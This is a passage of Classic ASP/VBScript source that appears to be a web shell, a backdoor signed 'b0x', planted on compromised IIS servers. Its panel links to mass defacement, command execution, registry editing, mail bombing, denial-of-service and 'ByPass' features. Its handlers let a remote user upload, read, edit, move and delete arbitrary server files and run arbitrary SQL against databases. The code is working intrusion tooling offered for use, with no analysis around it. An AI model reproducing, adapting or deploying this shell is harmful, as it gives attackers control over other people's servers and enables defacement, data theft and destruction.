        Dim llngIndex
        llngLength = Len(pstrUnicode)
        For llngIndex = 1 To llngLength
            CStrB = CStrB & ChrB(Asc(Mid(pstrUnicode, llngIndex, 1)))
        Next
    End Function
End Class

Class clsField
    Public Name
    Private mstrPath
    Public FileDir
    Public FileExt
    Public FileName
    Public ContentType
    Public Value
    Public BinaryData
    Public Length
    Private mstrText

    Public Property Get BLOB()
        BLOB = BinaryData
    End Property

    Public Function BinaryAsText()
        Dim lbinBytes
        Dim lobjRs
        If Length = 0 Then Exit Function
        If LenB(BinaryData) = 0 Then Exit Function

        If Not Len(mstrText) = 0 Then
            BinaryAsText = mstrText
            Exit Function
        End If
        lbinBytes = ASCII2Bytes(BinaryData)
           mstrText = Bytes2Unicode(lbinBytes)
        BinaryAsText = mstrText
    End Function

    Public Sub SaveAs(ByRef pstrFileName)
        Const adTypeBinary=1
        Const adSaveCreateOverWrite=2
        Dim lobjStream
        Dim lobjRs
        Dim lbinBytes
        If Length = 0 Then Exit Sub
        If LenB(BinaryData) = 0 Then Exit Sub
        Set lobjStream = Server.CreateObject("ADODB.Stream")
        lobjStream.Type = adTypeBinary
        Call lobjStream.Open()
        lbinBytes = ASCII2Bytes(BinaryData)
        Call lobjStream.Write(lbinBytes)

        On Error Resume Next

        Call lobjStream.SaveToFile(pstrFileName, adSaveCreateOverWrite)

        'if err<>0 then response.Write "<br>"&err.Description

        Call lobjStream.Close()
        Set lobjStream = Nothing
    End Sub

    Public Property Let FilePath(ByRef pstrPath)
        mstrPath = pstrPath
        If Not InStrRev(pstrPath, ".") = 0 Then
            FileExt = Mid(pstrPath, InStrRev(pstrPath, ".") + 1)
            FileExt = UCase(FileExt)
        End If
        If Not InStrRev(pstrPath, "\") = 0 Then
            FileName = Mid(pstrPath, InStrRev(pstrPath, "\") + 1)
        End If
        If Not InStrRev(pstrPath, "\") = 0 Then
            FileDir = Mid(pstrPath, 1, InStrRev(pstrPath, "\") - 1)
        End If
    End Property

    Public Property Get FilePath()
        FilePath = mstrPath
    End Property

    private Function ASCII2Bytes(ByRef pbinBinaryData)
        Const adLongVarBinary=205
        Dim lobjRs
        Dim llngLength
        Dim lbinBuffer
        llngLength = LenB(pbinBinaryData)
        Set lobjRs = Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarBinary, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBinaryData & ChrB(0))
        Call lobjRs.Update()
        lbinBuffer = lobjRs.Fields("BinaryData").GetChunk(llngLength)
        Call lobjRs.Close()
        Set lobjRs = Nothing
        ASCII2Bytes = lbinBuffer
    End Function

    Private Function Bytes2Unicode(ByRef pbinBytes)
        Dim lobjRs
        Dim llngLength
        Dim lstrBuffer
        llngLength = LenB(pbinBytes)
        Set lobjRs = Server.CreateObject("ADODB.Recordset")
        Call lobjRs.Fields.Append("BinaryData", adLongVarChar, llngLength)
        Call lobjRs.Open()
        Call lobjRs.AddNew()
        Call lobjRs.Fields("BinaryData").AppendChunk(pbinBytes)
        Call lobjRs.Update()
        lstrBuffer = lobjRs.Fields("BinaryData").Value
        Call lobjRs.Close()
        Set lobjRs = Nothing
        Bytes2Unicode = lstrBuffer
    End Function
End Class

function addslash(path)
    if right(path,1)="\" then addslash=path else addslash=path & "\"
end function

sub Upload()
    dim objUpload,f,max,i,name,path,size,success

    set objUpload=New clsUpload

    targetPath=objUpload.Fields("folder").Value
    max=objUpload.Fields("max").Value

    for i=1 to max
        name=objUpload.Fields("file" & i).FileName
        size=objUpload.Fields("file" & i).Length
        if (name<>"") and (size>0) then
            gMsg=gMsg & "<br>" & vbNewLine & "- " & name & " (" & FormatNumber(size,0) & " bytes): "
            path=addslash(targetPath) & name
            objUpload.Fields("file" & i).SaveAs path

            if b0x.FileExists(path) then
                on error resume next
                set f=objb0x.GetFile(path)
                if IsObject(f) then
                    if f.Size=size then success=true else success=false
                end if
                set f=nothing
            end if
            if success then  gMsg=gMsg & "<font color=blue>uploaded</font>" else gMsg = gMsg & "<font color=red>failed!</font>"
        end if
    next
    response.Write gMsg
    set objUpload=nothing

end sub



' MD5 kodlama ba?lad??..
Private Const BITS_TO_A_BYTE = 8
Private Const BYTES_TO_A_WORD = 4
Private Const BITS_TO_A_WORD = 32

Private m_lOnBits(30)
Private m_l2Power(30)
 
    m_lOnBits(0) = CLng(1)
    m_lOnBits(1) = CLng(3)
    m_lOnBits(2) = CLng(7)
    m_lOnBits(3) = CLng(15)
    m_lOnBits(4) = CLng(31)
    m_lOnBits(5) = CLng(63)
    m_lOnBits(6) = CLng(127)
    m_lOnBits(7) = CLng(255)
    m_lOnBits(8) = CLng(511)
    m_lOnBits(9) = CLng(1023)
    m_lOnBits(10) = CLng(2047)
    m_lOnBits(11) = CLng(4095)
    m_lOnBits(12) = CLng(8191)
    m_lOnBits(13) = CLng(16383)
    m_lOnBits(14) = CLng(32767)
    m_lOnBits(15) = CLng(65535)
    m_lOnBits(16) = CLng(131071)
    m_lOnBits(17) = CLng(262143)
    m_lOnBits(18) = CLng(524287)
    m_lOnBits(19) = CLng(1048575)
    m_lOnBits(20) = CLng(2097151)
    m_lOnBits(21) = CLng(4194303)
    m_lOnBits(22) = CLng(8388607)
    m_lOnBits(23) = CLng(16777215)
    m_lOnBits(24) = CLng(33554431)
    m_lOnBits(25) = CLng(67108863)
    m_lOnBits(26) = CLng(134217727)
    m_lOnBits(27) = CLng(268435455)
    m_lOnBits(28) = CLng(536870911)
    m_lOnBits(29) = CLng(1073741823)
    m_lOnBits(30) = CLng(2147483647)
    
    m_l2Power(0) = CLng(1)
    m_l2Power(1) = CLng(2)
    m_l2Power(2) = CLng(4)
    m_l2Power(3) = CLng(8)
    m_l2Power(4) = CLng(16)
    m_l2Power(5) = CLng(32)
    m_l2Power(6) = CLng(64)
    m_l2Power(7) = CLng(128)
    m_l2Power(8) = CLng(256)
    m_l2Power(9) = CLng(512)
    m_l2Power(10) = CLng(1024)
    m_l2Power(11) = CLng(2048)
    m_l2Power(12) = CLng(4096)
    m_l2Power(13) = CLng(8192)
    m_l2Power(14) = CLng(16384)
    m_l2Power(15) = CLng(32768)
    m_l2Power(16) = CLng(65536)
    m_l2Power(17) = CLng(131072)
    m_l2Power(18) = CLng(262144)
    m_l2Power(19) = CLng(524288)
    m_l2Power(20) = CLng(1048576)
    m_l2Power(21) = CLng(2097152)
    m_l2Power(22) = CLng(4194304)
    m_l2Power(23) = CLng(8388608)
    m_l2Power(24) = CLng(16777216)
    m_l2Power(25) = CLng(33554432)
    m_l2Power(26) = CLng(67108864)
    m_l2Power(27) = CLng(134217728)
    m_l2Power(28) = CLng(268435456)
    m_l2Power(29) = CLng(536870912)
    m_l2Power(30) = CLng(1073741824)

Private Function LShift(lValue, iShiftBits)
    If iShiftBits = 0 Then
        LShift = lValue
        Exit Function
    ElseIf iShiftBits = 31 Then
        If lValue And 1 Then
            LShift = &H80000000
        Else
            LShift = 0
        End If
        Exit Function
    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
        Err.Raise 6
    End If

    If (lValue And m_l2Power(31 - iShiftBits)) Then
        LShift = ((lValue And m_lOnBits(31 - (iShiftBits + 1))) * m_l2Power(iShiftBits)) Or &H80000000
    Else
        LShift = ((lValue And m_lOnBits(31 - iShiftBits)) * m_l2Power(iShiftBits))
    End If
End Function
Private Function RShift(lValue, iShiftBits)
    If iShiftBits = 0 Then
        RShift = lValue
        Exit Function
    ElseIf iShiftBits = 31 Then
        If lValue And &H80000000 Then
            RShift = 1
        Else
            RShift = 0
        End If
        Exit Function
    ElseIf iShiftBits < 0 Or iShiftBits > 31 Then
        Err.Raise 6
    End If
    
    RShift = (lValue And &H7FFFFFFE) \ m_l2Power(iShiftBits)

    If (lValue And &H80000000) Then
        RShift = (RShift Or (&H40000000 \ m_l2Power(iShiftBits - 1)))
    End If
End Function

Private Function RotateLeft(lValue, iShiftBits)
    RotateLeft = LShift(lValue, iShiftBits) Or RShift(lValue, (32 - iShiftBits))
End Function

Private Function AddUnsigned(lX, lY)
    Dim lX4
    Dim lY4
    Dim lX8
    Dim lY8
    Dim lResult
 
    lX8 = lX And &H80000000
    lY8 = lY And &H80000000
    lX4 = lX And &H40000000
    lY4 = lY And &H40000000
 
    lResult = (lX And &H3FFFFFFF) + (lY And &H3FFFFFFF)
 
    If lX4 And lY4 Then
        lResult = lResult Xor &H80000000 Xor lX8 Xor lY8
    ElseIf lX4 Or lY4 Then
        If lResult And &H40000000 Then
            lResult = lResult Xor &HC0000000 Xor lX8 Xor lY8
        Else
            lResult = lResult Xor &H40000000 Xor lX8 Xor lY8
        End If
    Else
        lResult = lResult Xor lX8 Xor lY8
    End If
 
    AddUnsigned = lResult
End Function

Private Function Fq(x, y, z)
    Fq = (x And y) Or ((Not x) And z)
End Function

Private Function Gq(x, y, z)
    Gq = (x And z) Or (y And (Not z))
End Function

Private Function Hq(x, y, z)
    Hq = (x Xor y Xor z)
End Function

Private Function Iq(x, y, z)
    Iq = (y Xor (x Or (Not z)))
End Function

Private Sub FF(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Fq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub GG(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Gq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub HH(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Hq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub II(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(Iq(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

'*********************************************************
'*************   COnverted Developed By TurkisH-RuleZ  ****************
'*******  The Brute Algortihms Owned to b0x  ;)   ******
'*********************************************************
'*********************************************************

Private Function ConvertToWordArray(sMessage)
    Dim lMessageLength
    Dim lNumberOfWords
    Dim lWordArray()
    Dim lBytePosition
    Dim lByteCount
    Dim lWordCount
    
    Const MODULUS_BITS = 512
    Const CONGRUENT_BITS = 448
    
    lMessageLength = Len(sMessage)
    
    lNumberOfWords = (((lMessageLength + ((MODULUS_BITS - CONGRUENT_BITS) \ BITS_TO_A_BYTE)) \ (MODULUS_BITS \ BITS_TO_A_BYTE)) + 1) * (MODULUS_BITS \ BITS_TO_A_WORD)
    ReDim lWordArray(lNumberOfWords - 1)
    
    lBytePosition = 0
    lByteCount = 0
    Do Until lByteCount >= lMessageLength
        lWordCount = lByteCount \ BYTES_TO_A_WORD
        lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE
        lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(Asc(Mid(sMessage, lByteCount + 1, 1)), lBytePosition)
        lByteCount = lByteCount + 1
    Loop

    lWordCount = lByteCount \ BYTES_TO_A_WORD
    lBytePosition = (lByteCount Mod BYTES_TO_A_WORD) * BITS_TO_A_BYTE

    lWordArray(lWordCount) = lWordArray(lWordCount) Or LShift(&H80, lBytePosition)

    lWordArray(lNumberOfWords - 2) = LShift(lMessageLength, 3)
    lWordArray(lNumberOfWords - 1) = RShift(lMessageLength, 29)
    
    ConvertToWordArray = lWordArray
End Function

Private Function WordToHex(lValue)
    Dim lByte
    Dim lCount
    
    For lCount = 0 To 3
        lByte = RShift(lValue, lCount * BITS_TO_A_BYTE) And m_lOnBits(BITS_TO_A_BYTE - 1)
        WordToHex = WordToHex & Right("0" & Hex(lByte), 2)
    Next
End Function


Public Function MD5(sMessage)
    Dim x
    Dim k
    Dim AA
    Dim BB
    Dim CC
    Dim DD
    Dim a
    Dim b
    Dim c
    Dim d
    
    Const S11 = 7
    Const S12 = 12
    Const S13 = 17
    Const S14 = 22
    Const S21 = 5
    Const S22 = 9
    Const S23 = 14
    Const S24 = 20
    Const S31 = 4
    Const S32 = 11
    Const S33 = 16
    Const S34 = 23
    Const S41 = 6
    Const S42 = 10
    Const S43 = 15
    Const S44 = 21

    x = ConvertToWordArray(sMessage)
    
    a = &H67452301
    b = &HEFCDAB89
    c = &H98BADCFE
    d = &H10325476

    For k = 0 To UBound(x) Step 16
        AA = a
        BB = b
        CC = c
        DD = d
    
        FF a, b, c, d, x(k + 0), S11, &HD76AA478
        FF d, a, b, c, x(k + 1), S12, &HE8C7B756
        FF c, d, a, b, x(k + 2), S13, &H242070DB
        FF b, c, d, a, x(k + 3), S14, &HC1BDCEEE
        FF a, b, c, d, x(k + 4), S11, &HF57C0FAF
        FF d, a, b, c, x(k + 5), S12, &H4787C62A
        FF c, d, a, b, x(k + 6), S13, &HA8304613
        FF b, c, d, a, x(k + 7), S14, &HFD469501
        FF a, b, c, d, x(k + 8), S11, &H698098D8
        FF d, a, b, c, x(k + 9), S12, &H8B44F7AF
        FF c, d, a, b, x(k + 10), S13, &HFFFF5BB1
        FF b, c, d, a, x(k + 11), S14, &H895CD7BE
        FF a, b, c, d, x(k + 12), S11, &H6B901122
        FF d, a, b, c, x(k + 13), S12, &HFD987193
        FF c, d, a, b, x(k + 14), S13, &HA679438E
        FF b, c, d, a, x(k + 15), S14, &H49B40821
    
        GG a, b, c, d, x(k + 1), S21, &HF61E2562
        GG d, a, b, c, x(k + 6), S22, &HC040B340
        GG c, d, a, b, x(k + 11), S23, &H265E5A51
        GG b, c, d, a, x(k + 0), S24, &HE9B6C7AA
        GG a, b, c, d, x(k + 5), S21, &HD62F105D
        GG d, a, b, c, x(k + 10), S22, &H2441453
        GG c, d, a, b, x(k + 15), S23, &HD8A1E681
        GG b, c, d, a, x(k + 4), S24, &HE7D3FBC8
        GG a, b, c, d, x(k + 9), S21, &H21E1CDE6
        GG d, a, b, c, x(k + 14), S22, &HC33707D6
        GG c, d, a, b, x(k + 3), S23, &HF4D50D87
        GG b, c, d, a, x(k + 8), S24, &H455A14ED
        GG a, b, c, d, x(k + 13), S21, &HA9E3E905
        GG d, a, b, c, x(k + 2), S22, &HFCEFA3F8
        GG c, d, a, b, x(k + 7), S23, &H676F02D9
        GG b, c, d, a, x(k + 12), S24, &H8D2A4C8A
            
        HH a, b, c, d, x(k + 5), S31, &HFFFA3942
        HH d, a, b, c, x(k + 8), S32, &H8771F681
        HH c, d, a, b, x(k + 11), S33, &H6D9D6122
        HH b, c, d, a, x(k + 14), S34, &HFDE5380C
        HH a, b, c, d, x(k + 1), S31, &HA4BEEA44
        HH d, a, b, c, x(k + 4), S32, &H4BDECFA9
        HH c, d, a, b, x(k + 7), S33, &HF6BB4B60
        HH b, c, d, a, x(k + 10), S34, &HBEBFBC70
        HH a, b, c, d, x(k + 13), S31, &H289B7EC6
        HH d, a, b, c, x(k + 0), S32, &HEAA127FA
        HH c, d, a, b, x(k + 3), S33, &HD4EF3085
        HH b, c, d, a, x(k + 6), S34, &H4881D05
        HH a, b, c, d, x(k + 9), S31, &HD9D4D039
        HH d, a, b, c, x(k + 12), S32, &HE6DB99E5
        HH c, d, a, b, x(k + 15), S33, &H1FA27CF8
        HH b, c, d, a, x(k + 2), S34, &HC4AC5665
    
        II a, b, c, d, x(k + 0), S41, &HF4292244
        II d, a, b, c, x(k + 7), S42, &H432AFF97
        II c, d, a, b, x(k + 14), S43, &HAB9423A7
        II b, c, d, a, x(k + 5), S44, &HFC93A039
        II a, b, c, d, x(k + 12), S41, &H655B59C3
        II d, a, b, c, x(k + 3), S42, &H8F0CCC92
        II c, d, a, b, x(k + 10), S43, &HFFEFF47D
        II b, c, d, a, x(k + 1), S44, &H85845DD1
        II a, b, c, d, x(k + 8), S41, &H6FA87E4F
        II d, a, b, c, x(k + 15), S42, &HFE2CE6E0
        II c, d, a, b, x(k + 6), S43, &HA3014314
        II b, c, d, a, x(k + 13), S44, &H4E0811A1
        II a, b, c, d, x(k + 4), S41, &HF7537E82
        II d, a, b, c, x(k + 11), S42, &HBD3AF235
        II c, d, a, b, x(k + 2), S43, &H2AD7D2BB
        II b, c, d, a, x(k + 9), S44, &HEB86D391
    
        a = AddUnsigned(a, AA)
        b = AddUnsigned(b, BB)
        c = AddUnsigned(c, CC)
        d = AddUnsigned(d, DD)
    Next
    
    MD5 = LCase(WordToHex(a) & WordToHex(b) & WordToHex(c) & WordToHex(d))
End Function
'***************************************************************************************************************************
'***************************  MD5 KOdlar? Biter.   *************************************************************************
'***************************************************************************************************************************
if popup = False then
'Link ve Path paneli by b0x
'Türk Bayra?? Ascii Karakterlerle - Created By b0x
Response.Write "<center><table width=80 height=50 cellpadding=0 cellspacing=0><tr><td width=10 align=left valign=middle style=""background-color:AA0000"">&nbsp;</td><td width=70 align=left valign=middle style=""background-color:AA0000""><font size=7 face=Wingdings>Z</font></td></tr></table></center>"
response.write "<center><table width=""100%"" align=""center"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center""><br>"
response.write "<table cellpadding=""0"" cellspacing=""0"" height=""25""><tr><td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<a href='"&FilePath&"?mode=37&Path="&Path&"&Time="&time&"'><b>System Information *</b></a> | <a href='"&FilePath&"?mode=18&Path="&Path&"&Time="&time&"' onclick=""mass(this.href);return false;""><b>MASS Attack</b></a> | <a href='"&FilePath&"?mode=21&Path="&FolderPath&"&Time="&time&"' onclick=""tester(this.href);return false;""><b> Permission Tester </b></a> | <a href='"&FilePath&"?mode=24&Path="&Path&"&Time="&time&"' onclick=""klasor(this.href);return false;""><b>Folder Options </b></a> | <a href='"&FilePath&"?mode=28&Path="&Path&"&Time="&time&"' onclick=""cmd(this.href);return false;""><b> CMD </b></a> | <a href='"&FilePath&"?mode=34&Path="&Path&"&Time="&time&"' ><b> My-MS_SQL </b></a> | <a href='"&FilePath&"?mode=45&Path="&Path&"&Time="&time&"' onclick=""cmd(this.href);return false;""><b> RegEdit </b></a> | <a href='"&FilePath&"?mode=99&Path="&Path&"&Time="&time&"' onclick=""biz(this.href);return false;""><b> *Contact Us*! </b></a>&nbsp;&nbsp;&nbsp;</td></tr></table><br>"
response.write "<table cellpadding=""0"" cellspacing=""0"" height=""25""><tr><td class=""kbrtm"">&nbsp;&nbsp;&nbsp;<a href='"&FilePath&"?mode=30&Path="&Path&"&Time="&time&"' onclick=""cmd(this.href);return false;""><b> Ping Attack? </b></a> | <a href='"&FilePath&"?mode=33&Path="&Path&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;""><b> Mail Bomber? </b></a> | <a href='"&FilePath&"?mode=31&Path="&Path&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;""><b> Ram & Cpu Attack </b></a> | <a href='"&FilePath&"?mode=32&Path="&Path&"&Time="&time&"' onclick=""somur(this.href);return false;""><b> Denial OF Service Attack </b></a> | <a href='"&FilePath&"?mode=39&Path="&Path&"&Time="&time&"' onclick=""klasor(this.href);return false;""><b> MD5 & Serv-U </b></a> | <a href='"&FilePath&"?mode=42&Path="&Path&"&Time="&time&"' onclick=""mass(this.href);return false;""><b> MSWCTools </b></a> | <a href='"&FilePath&"?mode=44&Path="&Path&"&Time="&time&"' onclick=""mass(this.href);return false;""><b> XMLHTTP/RF ByPass  </b></a>&nbsp;&nbsp;&nbsp;</td></tr></table><br>"
response.write "</td></tr><td><tr><form action = "" "&FilePath&"?mode=23&Path="&Path&"&Time="&time&" "" method=""post""><table cellpadding=""0"" cellspacing=""0""><tr><td style=""background-color:121212"" class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b>Search: &nbsp;&nbsp;&nbsp;</b></td><td><input name=""hacked"" value=""mdb"" type=""text"" style=""width:200px;""></td><td><input type=""Submit"" value=""&nbsp;&nbsp;Go &raquo;&nbsp;&nbsp;"" style=""width:70; font-weight:bold;""></td></tr></table></td></form></tr><td><tr>"
response.write "<form action = "" "&FilePath&"?mode=1&Time="&time&" "" method=""post"">"
response.write "<table cellpadding=""0"" cellspacing=""0""><tr><td style=""background-color:121212"" class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b>Path : &nbsp;&nbsp;&nbsp;</b></td><td><input name=""remote"" value='"&Path&"' type=""text"" style=""width:350px;""></td><td><input type=""Submit"" value=""Move &raquo;"" style=""width:50; font-weight:bold;""></td></tr></table>"
response.write ""
response.write "</td></form></tr>"
response.write "</table></center>"

'Yetki paneli Coded by b0x
response.write "<table width=""100%"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<table cellpadding=""0"" cellspacing=""0"">"
response.write "<tr><td style=""background-color:121212"" class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b>Options :</b>&nbsp;&nbsp;&nbsp;</td>"
call yetki
response.write "</tr></table>"
response.write "<br></td></tr></table><br>"
end if



SELECT CASE mode
CASE 2 ' Dizin Copy TA?I Coded by b0x
on error resume next
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dizincopypaste"" action='"&FilePath&"' type=""post"">"
response.write "<table class=""kbrtm"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
tablo30(" <b>Dizin Copy / Ta?? Merkezi</b>")
tablo30("&nbsp;")
response.write "<input type=""hidden"" value=""3"" name=""mode""><input type=""hidden"" value="&file&" name=""file2""><input type=""hidden"" value="&FolderPath&" name=""Path""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12("Kop. Yer : <input style='color=#C6FCBE'  size=""60"" type=""text"" name=""FolderPath2"" value="&FolderPath&">")
tablo12("<input type=radio name='islem' value='kopyala' checked>Copy  <input type=radio name='islem' value='tasi'>Move File")
tablo12("<br><input value="" G?nder "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
Call Status 

CASE 3 ' dizin kop ta??mam gerçekle?iyor  by b0x
on error resume next
if islem="kopyala" then
    b0x.CopyFolder Path,FolderPath2
    isl="kopyaland?.."
elseif islem="tasi" then
    b0x.MoveFolder Path,FolderPath2
    isl="ta??nd?.."
end if
response.Write "<br><br><center>Klasor "&isl&" <br>"
response.Write "<br><font color=yellow>Kaynak : </font>"&FolderPath&"<br><font color=yellow>Hedef : </font>"&FolderPath2
response.Write "<br><br>by b0x</center>"
Call Status 

CASE 4 ' Dizin S?lmee by b0x
on error resume next
b0x.DeleteFolder del
if err<>0 then
Call olmadi("Dizin Silenemdi")
else
Call oldu("Dizin Silindi")
end if

CASE 5 ' Dosya Deleting  olay? gerçekli?iypor  by b0x
on error resume next
b0x.DeleteFile del
if err<>0 then
Call olmadi("Dosya Silinemedi")
else
Call oldu("Dosya Silindi")
end if

'CASE 6 ' Dosya Dowlaod etme by b0x
' Download Status l? oldu?u için, USTTE ta??d?mm

CASE 7 ' Dosya Kopayla Ta??ma POST k?sm? by b0x
on error resume next
response.write "<table width=""100%"">"
response.write "<tr class=""kbrtm"" valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dosyacopypaste"" action='"&FilePath&"' type=""post"">"
response.write "<table class=""kbrtm"" cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"">"
tablo30(" <b>Copy File</b>")
tablo30("&nbsp;")
response.write "<input type=""hidden"" value=""8"" name=""mode""><input type=""hidden"" value="&time&" name=""Time""><input type=""hidden"" value="&file&" name=""file""> " 
tablo12("Kop. Yer : <input  size=""60"" type=""text"" name=""folder"" value="&file&">")
tablo12("<input type=radio name='islem' value='kopyala' checked>Copy  <input type=radio name='islem' value='tasi'>Move ")
tablo12("<br><input value="" G?nder "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
Call Status 

CASE 8 ' Dosya kopyala, ta??maa olay? by b0x
on error resume next
if islem="kopyala" then
    b0x.CopyFile file,folder&""
    isl="kopyaland?.."
elseif islem="tasi" then
    b0x.MoveFile file,folder&""
    isl="ta??nd?.."
end if
if err <> 0 then
response.Write "<br><br><center>Ba?ar?s?zl?kla sonuçland? !!! <br>"
else
response.Write "<br><br><center>Klasor "&isl&" <br>"
end if
response.Write "<br><font color=yellow>Kaynak : </font>"&file&"<br><font color=yellow>Hedef : </font>"&folder&"\"
response.Write "<br><br>by b0x</center>"
Call Status 

CASE 9 ' Dosya ?çini Go by b0x
on error resume next
Response.Write "<center><b><font color=orange>"&path&"</font></b></center><br>"
Response.Write "<table class=""kbrtm"" width=100% ><tr><td>"
set f = b0x.OpenTextFile(file,1)
Response.Write "<font size=3><pre>"&Server.HTMLEncode(f.readAll)&"</pre></font>"
Response.Write "</td></tr></table>"
nolist = True
if err<>62 then Status 
if err.number=62 then 
Response.Write "<script language=javascript>alert('Bu Dosya Okunam?yor\nSistem dosyas? olabilir')</script>"
nolist = False
end if

CASE 10 ' ASP txt php .. gibi dosyalar? Editlemek için POSt k?sm? by b0x 
on error resume next
set f = b0x.OpenTextFile(file,1)
response.Write "<center><form action='"&FilePath&"?Time="&time&"&Path="&FolderPath&"' method=""post""><table class=""kbrtm""><tr><td align=""center"">"
Response.Write "<input type=hidden name=""mode"" value='11'>"
Response.Write "<input type=hidden name=file value="&file&">"
Response.Write "<br><br><input type=submit value="" .. ::   Save   :: ..  ""><br><br></td></tr><tr><td align=""center"">"
Response.Write "<textarea name=""islem"" style='width:90%;height:350;'>"
Response.Write server.HTMLEncode(f.readAll)
Response.Write "</textarea></td></tr></table></form></center>"
Call Status 
nolist = True

CASE 11 ' Editleme olay?? gerçekle?iyor by b0x
on error resume next
set saveTextFile = b0x.OpenTextFile(file,2,true,false)
Call Status 
saveTextFile.Write(islem)
saveTextFile.close
if err<>0 then
olmadi("Editlenemedii")
else
oldu("Editlendi")
end if

CASE 12 ' Resim Dosyas?n? Goe  by b0x
on error resume next
Response.Write "<br><center><img ALT=""CyberWarrior // b0x"" src='"&file&"'></center><br><br>"
Call Status 
nolist = True

CASE 13 ' SQL için TAblolar? Listeleme by b0x
Response.Write "<center><b><font size=3>Tablolar</font></br><br>"
Set objConn = Server.CreateObject("ADODB.Connection")
Set objADOX = Server.CreateObject("ADOX.Catalog")
objConn.Provider = "Microsoft.Jet.Oledb.4.0"
objConn.ConnectionString = file
objConn.Open
objADOX.ActiveConnection = objConn

response.write "<table class=""kbrtm"">"
For Each table in objADOX.Tables
    If table.Type = "TABLE" Then
        Response.Write "<tr><td><font face=wingdings size=5>4</font> <a href='"&FilePath&"?mode=14&file="&file&"&table="&table.Name&"&Path="&FolderPath&"&time="&time&"'>"&table.Name&"</a></td></tr>"
    End If
Next
response.write "</table>"
response.write "</center>"
Call Status 
nolist = True

CASE 14 ' TAblo içeri?i Gome by b0x
Call SQL_menu_by_b0x
Call SQL_by_b0x(file,table)
nolist = True

CASE 15 ' SQL kod yerle?tirme olay? by b0x
if islem = "select" then inject = inject1
if islem = "delete" then inject = inject2
if islem = "insert" then inject = inject3
if islem = "update" then inject = inject4
if islem = "diger" then inject = inject5
SQL_menu_by_b0x
response.write "<br><center>Db Yeri : <font color=#C6FCBE>"&file&"</font></center>"
response.write "<br><center>Sql komut : <font color=#C6FCBE>"&inject&"</font></center><br>"
if islem = "select" then
	if not b0xsql = "" then
		Call MSSQL_by_b0x(b0xsql,inject)
	else
		Call SQL_by_b0x(file,inject)
	end if
else
on error resume next
if b0xsql = "" then
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Provider = "Microsoft.Jet.Oledb.4.0"
	objConn.ConnectionString = file
	objConn.Open
else
	Set objConn = Server.CreateObject("ADODB.Connection")
	Set objRcs = Server.CreateObject("ADODB.RecordSet")
	objConn.Open b0xsql
end if

if err <> 0 then
	response.write "<br><br><center> <font color=#FE7A84> <font face=Wingdings size=5>N</font> DataBase ile Ba?lant?n?z Sa?lanaMAd?? !!! by b0x :( <font color=#FE7A84> <font face=Wingdings size=5>N</font> </font> </center><br><br>"
else
	on error resume next
	objRcs.Open inject,objConn, adOpenKeyset , , adCmdText
	if err <> 0 then
		Call olmadi("<br>SQL ?njection Komutunuzda Status  var. Bilmiyorsan Kullanma<br><br>")
	else
		Call oldu("<br> SQL ?njection Ba?ar?yla GErçekle?tii.<br><br>")
	end if
end if
objRcs.close
objConn.close
end if
nolist = True

CASE 16 ' Dosya ADI de?i?tirme Formu by b0x
on error resume next
response.write "<table width=""100%"">"
response.write "<tr valign=""top""><td colspan=""2"" align=""center"">"
response.write "<form name=""dosyanameedit"" action='"&FilePath&"' type=""post"">"
response.write "<table cellpadding=""1"" cellspacing=""1"" bgcolor=""#5d5d5d"" width=""100%"" class=""kbrtm"" >"
tablo30(" <b>Dosya AD? de?i?tirme MErkezi</b>")
tablo30("Ad? :  <font color=#C6FCBE>"&islem&"</font> <br> Yeri :  <font color=#C6FCBE>"&file&"</font>")
response.write "<input type=""hidden"" value=""17"" name=""mode""><input type=""hidden"" value="&file&" name=""file""><input type=""hidden"" value="&FolderPath&" name=""Path""><input type=""hidden"" value="&time&" name=""Time""> " 
tablo12("<b>Dosyan?n Yeni Ad?:  </b> &nbsp;<input  size=""30"" type=""text"" name=""islem"" value="&islem&">")
tablo12("<br><input value="" G?nder "" type=""Submit"">")
response.write "</form></table></td></tr></table><br>"
Call Status 

CASE 17 ' Dosya Ad? de?i?tirme Olay? gerçekle?iyor by b0x
on error resume next
Set fileObject = b0x.GetFile(file) 
fileObject.Name = islem 
if err <> 0 then
	Call olmadi("<br>DOsya Ad? de?i?eMEdii<br><br>")
else
	Call oldu("<br>Dosya Ad? de?i?ti<br><br>")
end if
Set fileObject = Nothing 
Call Status 

CASE 18 ' MAss Defeced Merkezi by b0x
on error resume next
